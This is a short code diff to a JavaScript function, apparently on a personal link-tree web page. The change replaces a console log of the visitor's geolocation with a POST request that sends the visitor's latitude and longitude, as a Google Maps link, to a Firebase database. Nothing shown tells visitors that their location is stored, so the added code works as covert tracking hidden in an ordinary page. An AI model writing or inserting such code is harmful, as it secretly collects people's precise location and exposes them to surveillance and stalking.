@@ -428,7 +428,15 @@
         }
 
         function logPosition(position) {
-            console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
+            fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/locations", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    url: `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`
+                })
+            })
         }
 
         function setYearCopyright() {
